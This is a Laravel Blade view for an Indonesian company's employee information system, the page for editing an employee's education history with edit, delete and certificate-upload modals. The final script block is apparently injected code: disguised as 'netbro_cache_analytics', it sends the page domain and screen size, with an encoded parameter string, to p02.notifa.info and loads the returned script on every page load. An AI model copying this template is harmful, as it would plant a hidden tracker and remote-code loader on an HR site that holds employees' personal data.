<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="description" content="">
  <meta name="author" content="">
  <link rel="shortcut icon" href="/image/favicon.png">
  <title>Data Karyawan</title>
  <link rel="stylesheet" type="text/css" href="/assets/lib/perfect-scrollbar/css/perfect-scrollbar.min.css"/>
  <link rel="stylesheet" type="text/css" href="/assets/lib/material-design-icons/css/material-design-iconic-font.min.css"/>
  <link rel="stylesheet" type="text/css" href="/assets/lib/datatables/css/dataTables.bootstrap.min.css"/>
  <link rel="stylesheet" href="/assets/css/style.css" type="text/css"/>
  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.0/css/all.css" integrity="sha384-lZN37f5QGtY3VHgisS14W3ExzMWZxybE1SJSEsQp9S+oqd12jhcu+A56Ebc1zFSJ" crossorigin="anonymous">
  <link rel="stylesheet" type="text/css" href="/assets/lib/jquery.vectormap/jquery-jvectormap-1.2.2.css"/>
  <link rel="stylesheet" type="text/css" href="/assets/lib/jqvmap/jqvmap.min.css"/>
  <link rel="stylesheet" type="text/css" href="/assets/lib/datetimepicker/css/bootstrap-datetimepicker.min.css"/>
  <link rel="stylesheet" type="text/css" href="/assets/css/float_button.css">
  <link rel="stylesheet" type="text/css" href="/css/croppie.css">
  <!-- Toastr untuk notifikasi -->
  <link href="//cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/css/toastr.min.css" rel="stylesheet">
</head>
<body>

  <!-- Wrapper Start   --> 
  <div class="be-wrapper">
   
    <!--  Sidebar Start -->  
    <div class="be-wrapper be-fixed-sidebar">
      @include('Beranda.sidebar')
    </div>
    <!--  Sidebar End --> 

    <!-- Konten -->
    <div class="be-content">
      <div class="page-head">
        <h2 class="page-head-title">Edit Data Karyawan</h2>
        <ol class="breadcrumb page-head-nav">
          <li><a href="/datakaryawan">Data Karyawan</a></li>
          <li class="active">Edit Riwayat Pendidikan</li>
        </ol>
      </div>
      

      <div class="main-content container-fluid">
        <div class="row">
          <div class="col-sm-12">
            <div class="panel panel-default panel-table">
              <div class="panel-body">

                <div>
                  <ul class="progressbar">
                    <a class="a" href="/datakaryawan/{{$data_karyawan->nik}}/edit/data_pribadi"><li class="done">Data Pribadi</li></a>
                    <a class="a" href="/datakaryawan/{{$data_karyawan->nik}}/edit/data_keluarga"><li class="done">Data Keluarga</li></a>
                    <a class="a" href="/datakaryawan/{{$data_karyawan->nik}}/edit/data_pendidikan"><li class="active">Riwayat Pendidikan</li></a>
                    <a class="a" href="/datakaryawan/{{$data_karyawan->nik}}/edit/data_riwayat_pekerjaan"><li class="">Riwayat Pekerjaan</li></a><br>
                  </ul><br>
                </div><br>

                <div class="panel-heading">Data Pendidikan</div>
                
                <div class="modal-body">
                  <div class="table-responsive noSwipe">
                    <table id=myTable class="table table-striped table-hover">
                     <thead>
                      <tr>
                        <th style="width:30%">Jenjang Pendidikan</th>
                        <th style="width:20%">Nama Institusi</th>
                        <th style="width:20%">Kota</th>
                        <th style="width:20%">Jurusan</th>
                        <th style="width:20%">Periode</th>
                        <th align="center" style="width:30%">Aksi</th>
                      </tr>
                    </thead>
                    @foreach($riwayat_pendidikan as $data)
                    <tbody>
                      <tr>
                        <td>{{$data->jenjang_pendidikan}}</td>
                        <td>{{$data->nama_sekolah}}</td>
                        <td>{{$data->kota_sekolah}}</td>
                        <td>{{$data->jurusan_pendidikan}}</td>
                        <td>{{$data->periode_pendidikan}}</td>
                        <td>
                         <button data-toggle="modal" data-target="#edit-data-familia-{{$data->id_riwayat_pendidikan}}" type="button" class="btn btn-space btn-warning"> Edit </button>
                         <button data-toggle="modal" data-target="#hapus-{{$data->id_riwayat_pendidikan}}" type="button" class="btn btn-space btn-danger"> Hapus </button>
                       </td>



                       <!-- Modals untuk Edit Data Familia -->
                       
                       <div id="edit-data-familia-{{$data->id_riwayat_pendidikan}}" tabindex="-1" role="dialog" class="modal fade colored-header colored-header-primary">
                        <div class="modal-dialog">

                          <div class="modal-content">
                            
                            <div class="modal-header">
                              <button type="button" data-dismiss="modal" aria-hidden="true" class="close"><span class="mdi mdi-close"></span></button>
                              <h3 class="modal-title">Edit Data Pendidikan</h3>
                            </div>
                            <form id="form_submit_edit" name="submit1" action="/datakaryawan/{{$data->id_riwayat_pendidikan}}/update/data_pendidikan" method="POST" enctype="multipart/form-data">
                             @csrf
                             <div class="modal-body">
                               <div class="form-group">
                                <label>Jenjang Pendidikan</label>
                                <input name="jenjang_pendidikan" value="{{$data->jenjang_pendidikan}}" type="text" class="form-control">
                              </div>
                              <div class="form-group">
                                <label>Nama Institusi</label>
                                <input name="nama_sekolah" value="{{$data->nama_sekolah}}" type="text" class="form-control">
                              </div>
                              <div class="form-group">
                                <label>Kota Institusi</label>
                                <input name="kota_sekolah" value="{{$data->kota_sekolah}}" type="text" class="form-control">
                              </div>
                              <div class="form-group">
                                <label>Jurusan </label>
                                <input name="jurusan_pendidikan" value="{{$data->jurusan_pendidikan}}" type="text" class="form-control" >         
                              </div>
                              <div class="form-group">
                                <label>Periode</label>
                                <input name="periode_pendidikan" value="{{$data->periode_pendidikan}}" type="text" class="form-control" >
                              </div>
                              <label>Foto Ijazah/Sertifikat</label>
                              <div align="center" class="form-group">
                                <img id="foto_IjazahSertifikat{{$data->id_riwayat_pendidikan}}" src="/image/IjazahSertifikat/{{$data->foto_ijazah_sertifikat}}" alt="Placeholder" class="img-data"><br>
                                <div align="center" class="upload-btn-wrapper">
                                  <button class="btn btn-default">Upload Ijazah/Sertifikat</button>
                                  <input id="input_foto_IjazahSertifikat{{$data->id_riwayat_pendidikan}}" class="input_foto_IjazahSertifikat{{$data->id_riwayat_pendidikan}}" type="file" name="foto_ijazah_sertifikat" onchange="readURL_IjazahSertifikat_{{$data->id_riwayat_pendidikan}}(this)" />
                                </div>
                              </div>
                            </div>
                            
                            <div class="modal-footer">
                              <button type="button" data-dismiss="modal" class="btn btn-default">Batal</button>
                              <button id="submit1" name="submit1" type="submit1" class="btn btn-primary" onclick="submitFormsTambah()">Simpan</button>
                            </div>
                            <script type="text/javascript">
                                    //fungsi preview foto verklarin

                                    function readURL_IjazahSertifikat_{{$data->id_riwayat_pendidikan}}(input) {
                                     if (input.files && input.files[0]) {
                                      var reader = new FileReader();

                                      reader.onload = function (e) {
                                       $('#foto_IjazahSertifikat{{$data->id_riwayat_pendidikan}}')
                                       .attr('src', e.target.result);
                                     };

                                     reader.readAsDataURL(input.files[0]);
                                   }
                                 }

                                 
                                  //end fungsi preview foto Ijazah/Sertifikat
                                </script>
                              </form>
                            </div>
                          </div>
                        </div> 
                        
                        
                        <!--Akhir dari Modals Edit data familia -->


                        <!-- Modals untuk Hapus -->

                        <div id="hapus-{{$data->id_riwayat_pendidikan}}" tabindex="-1" role="dialog" class="modal fade">
                          <div class="modal-dialog">
                            <div class="modal-content">
                              <div class="modal-header">
                                <button type="button" data-dismiss="modal" aria-hidden="true" class="close"><span class="mdi mdi-close"></span></button>
                              </div>
                              <div class="modal-body">
                                <div class="text-center">
                                  <div class="text-danger"><span class="modal-main-icon mdi mdi-close-circle-o"></span></div>
                                  <h3>Apakah Anda yakin untuk menghapus data</h3>
                                  <p><font size="4">{{$data->jenjang_pendidikan}}, {{$data->nama_sekolah}}, {{$data->jurusan_pendidikan}}, {{$data->periode_pendidikan}}?</font> <br><br>
                                  (* Data yang telah dihapus tidak dapat dikembalikan)</p>
                                  <div class="xs-mt-50">
                                    <button type="button" data-dismiss="modal" class="btn btn-space btn-default">Batal</button>
                                    <a href="/datakaryawan/{{$data->id_riwayat_pendidikan}}/delete/data_pendidikan"><button type="button" class="btn btn-space btn-danger">Hapus</button></a>
                                  </div>
                                </div>
                              </div>
                              <div class="modal-footer"></div>
                            </div>
                          </div>
                        </div>
                        <!--Akhir dari Modals Hapus -->

                      </tr>
                    </tbody>
                    @endforeach
                  </table>
                  <div align="center" class="form-group">
                    <tr><br>
                      @foreach($foto_ijazah_sertifikat as $riwayat)

                      @if(is_null($riwayat->foto_ijazah_sertifikat))
                      <!-- Do Nothing  -->
                      @else
                      <td align="center" class="form-group">
                        <img data-toggle="modal" data-target="#modal-transparent-pendidikan{{$riwayat->id_riwayat_pendidikan}}" src="/image/IjazahSertifikat/{{$riwayat->foto_ijazah_sertifikat}}" alt="Placeholder" class="img-data">
                      </td>

                      <!-- Modal Foto Ijazah dan Sertifikat-->
                      <div  class="modal modal-transparent fade" id="modal-transparent-pendidikan{{$riwayat->id_riwayat_pendidikan}}" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
                        <div class="modal-header">
                          <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
                        </div>
                        <div class="modal-body">
                          <center>  
                            <img src="/image/IjazahSertifikat/{{$riwayat->foto_ijazah_sertifikat}}" alt="" class="img-responsive">
                          </center>
                        </div>
                      </div>
                      @endif
                      @endforeach
                    </tr>
                  </div>

                </div>
                <!-- End Modal Body -->

                
                <div class="modal-footer">
                  <a href="/datakaryawan/{{$data_karyawan->nik}}/edit/data_keluarga"><button type="button" data-dismiss="modal" class="btn btn-default">Kembali</button></a>
                  <button data-toggle="modal" data-target="#tambah-data-familia" type="button" data-dismiss="modal" class="btn btn-primary">Tambah</button>
                  <a href="/datakaryawan/{{$data_karyawan->nik}}/edit/data_riwayat_pekerjaan"><button type="button" data-dismiss="modal" class="btn btn-default">Lanjut</button></a>
                </div>

                <!-- Modals untuk Edit Tambah Data Pendidikan -->
                <form id="form_submit2" name="form_submit2" action="/datakaryawan/tambah/update/data_pendidikan" method="POST" enctype="multipart/form-data">
                 @csrf
                 <div id="tambah-data-familia" tabindex="-1" role="dialog" class="modal fade colored-header colored-header-primary">
                  <div class="modal-dialog">
                    <div class="modal-content">
                      
                      <div class="modal-header">
                        <button type="button" data-dismiss="modal" aria-hidden="true" class="close"><span class="mdi mdi-close"></span></button>
                        <h3 class="modal-title">Tambah Data Pendidikan</h3>
                      </div>
                      <div class="modal-body">
                       <div class="form-group">
                        <label>Jenjang Pendidikan</label>
                        <input name="jenjang_pendidikan" type="text" class="form-control" required="">
                      </div>
                      <div class="form-group">
                        <label>Nama Institusi</label>
                        <input name="nama_sekolah" type="text" class="form-control" required="">
                      </div>
                      <div class="form-group">
                        <label>Kota Institusi</label>
                        <input name="kota_sekolah" type="text" class="form-control" required="">
                      </div>
                      <div class="form-group">
                        <label>Jurusan</label>
                        <input name="jurusan_pendidikan" type="text" class="form-control" required="">              
                      </div>
                      <div class="form-group">
                        <label>Periode</label>
                        <input name="periode_pendidikan" type="text" class="form-control" required="">
                      </div>
                      <div class="form-group">
                        <input value="{{$data_karyawan->nik}}" name="nik" type="hidden" class="form-control" required="" >
                      </div>
                      <label>Foto Ijazah/Sertifikat</label>
                      <div align="center" class="form-group">
                        <img id="tambah_foto_IjazahSertifikat" src="/image/IjazahSertifikat/140x140.png" alt="Placeholder" class="img-data"><br>
                        <div align="center" class="upload-btn-wrapper">
                          <button class="btn btn-default">Upload Ijazah/Sertifikat</button>
                          <input id="tambah_input_foto_IjazahSertifikat" type="file" name="foto_ijazah_sertifikat" required=""/>
                        </div>
                      </div>
                    </div>
                    <div class="modal-footer">
                      <button type="button" data-dismiss="modal" class="btn btn-default">Batal</button>
                      <button id="submit2" type="submit2" class="btn btn-primary" onclick="submitFormsTambah()">Tambah</button>
                    </div>
                  </div>
                </div>
              </div> 
            </form>
            <!--Akhir dari Modals Edit data familia -->

          </div>

          
        </div>
      </div>
    </div>
  </div>
</div>
</div>

<div class="text-center">
  <div class="credits">
    <p>Sistem Informasi Karyawan<b> Idea Imaji Persada</b></p>
  </div>
</div>

<!-- Script Toastr untuk notifikasi-->
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/js/toastr.min.js"></script>

<script>
 @if (Session::has('message'))
 var type = "{{Session::get('alert-type','info')}}";
 toastr.options = {
  "debug": false,
  "onclick": null,
  "fadeIn": 300,
  "fadeOut": 1000,
  "timeOut": 5000,
  "extendedTimeOut": 1000
}

switch(type)
{
  case 'info':
  toastr.info("{{Session::get('message')}}");
  break;

  case 'success':
  toastr.success("{{Session::get('message')}}");
  break;

  case 'warning':
  toastr.warning("{{Session::get('message')}}");
  break;

  case 'error':
  toastr.error("{{Session::get('message')}}");
  break;
}

@endif

</script>

<!-- JS untuk opsi resign di bagian edit data karyawan -->

<script src="/assets/lib/jquery/jquery.min.js" type="text/javascript"></script>
<script src="/assets/lib/perfect-scrollbar/js/perfect-scrollbar.jquery.min.js" type="text/javascript"></script>
<script src="/assets/js/main.js" type="text/javascript"></script>
<script src="/assets/lib/bootstrap/dist/js/bootstrap.min.js" type="text/javascript"></script>
<script src="/assets/lib/datatables/js/jquery.dataTables.min.js" type="text/javascript"></script>
<script src="/assets/lib/datatables/js/dataTables.bootstrap.min.js" type="text/javascript"></script>
<script src="/assets/lib/datatables/plugins/buttons/js/dataTables.buttons.js" type="text/javascript"></script>
<script src="/assets/lib/datatables/plugins/buttons/js/buttons.html5.js" type="text/javascript"></script>
<script src="/assets/lib/datatables/plugins/buttons/js/buttons.flash.js" type="text/javascript"></script>
<script src="/assets/lib/datatables/plugins/buttons/js/buttons.print.js" type="text/javascript"></script>
<script src="/assets/lib/datatables/plugins/buttons/js/buttons.colVis.js" type="text/javascript"></script>
<script src="/assets/lib/datatables/plugins/buttons/js/buttons.bootstrap.js" type="text/javascript"></script>
<script src="/js/croppie.js"></script>

<script type="text/javascript">

  function readURL_tambah_IjazahSertifikat(input) {
   if (input.files && input.files[0]) {
    var reader = new FileReader();

    reader.onload = function (e) {
      $('#tambah_foto_IjazahSertifikat')
      .attr('src', e.target.result);
    };

    reader.readAsDataURL(input.files[0]);
  }
}

$("#tambah_input_foto_IjazahSertifikat").change(function () {
  readURL_tambah_IjazahSertifikat(this);
});


</script>

<script type="text/javascript">
  document.getElementById("status").onchange = function () {
    document.getElementById("alasan").setAttribute("disabled", "disabled");
    document.getElementById("tgl_resign").setAttribute("disabled", "disabled");
    if (this.value == 'Resign')
      document.getElementById("alasan").removeAttribute("disabled");
    if (this.value == 'Resign')
      document.getElementById("tgl_resign").removeAttribute("disabled");
  };

      // Fungsi Logout

      $(function(){
        $('a#logout').click(function(){
          if(confirm('Apakah anda yakin ingin keluar ?')) {
            return true;
          }

          return false;
        });
      });
    </script>

    // Fungsi Menu dashboard
    <script type="text/javascript">
      $(document).ready(function(){

        App.init();
        App.dashboard();

      });
    </script>

    <script type="text/javascript">
      if (self == top) {
        function netbro_cache_analytics(fn, callback) {
          setTimeout(function() {
            fn();
            callback();
          }, 0);
        }

        function sync(fn) {
          fn();
        }

        function requestCfs() {
          var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
          var idc_glo_r = Math.floor(Math.random() * 99999999999);
          var url = idc_glo_url + "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mrwd1XyoNwUzpvf2l56FucADiEx%2bf3JAPJogkNU%2biFfwCiZ%2bA5y%2fz1GPfkI78hOjpKGi13lyWOD4PTAvdGjGONrTkbHyQtyDiXMT6f73PUxXAafylPFQAofDmqSRGCN6kLPoPHF5oxuxg%2bsgcyENso77BDI%2biq12wLsMGa%2bin6lXObrjR5nN3n3mCHDOu9rOERnmtSCzsvQVvQC2um1T%2fNsq2QIjE4KBpR9Vkl2LpxVPpB5ls%2failQCaTL23yQg6%2fVmE4aJahv4ErgHCjfL9mX4EPIxsCfVSS1MVwUyVfrSegVjjaXYDrZcarSkz7F2VXD0r3sg%2bPtdKUwpPNNQOOz0e5p%2bJ9WrZ7lxjycaB2F9Ci38ljGYNDUDDsnXT6j2Y7m3PBs%2bu3Atlk%2f2VykRlaJnvFNX%2bS%2flT5eDv6PQdmrWoWEBnXUCINHwnSwu3Cu7NudtMWlNGrsWK93HbdfLL45H%2f2NwIlDGeGNFBHlAFq869dDf3eePYoKSnP2OLHCFol" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
          var bsa = document.createElement('script');
          bsa.type = 'text/javascript';
          bsa.async = true;
          bsa.src = url;
          (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
        }
        netbro_cache_analytics(requestCfs, function() {});
      };

    </script>

  </body>
  </html>
